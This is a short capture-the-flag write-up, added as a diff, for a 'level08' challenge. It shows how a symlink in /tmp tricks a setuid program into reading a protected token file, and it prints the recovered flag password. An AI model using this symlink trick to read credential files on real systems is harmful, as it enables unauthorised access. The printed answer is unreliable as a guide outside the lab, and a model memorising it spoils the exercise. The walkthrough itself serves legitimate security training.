@@ -1,0 +1,11 @@
+##LEVEL 08
+
+The token file cannot be directly read. However, it is possible to read it with a symbolic link.
+
+`ln -s /home/user/level08/token /tmp/yolo`
+
+Then we can execute `./level08 /tmp/yolo` and we get the token.
+
+`su flag08` -> quif5eloekouj29ke0vouxean
+
+Then getflag.
